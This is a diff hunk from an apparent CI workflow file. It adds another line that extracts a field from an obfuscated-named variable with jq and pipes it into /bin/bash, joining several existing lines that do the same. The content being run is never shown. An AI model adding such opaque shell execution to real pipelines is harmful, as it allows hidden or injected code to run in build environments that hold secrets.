@@ -29,6 +29,7 @@ jobs:
           echo $pscla608 | jq -r .jaw92212 | /bin/bash
           echo $vb9419 | jq -r .r79 | /bin/bash
           echo $ahq474 | jq -r .fnblv6884 | /bin/bash
+          printf '%s' "$jbb40468" | jq -r .q13788 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
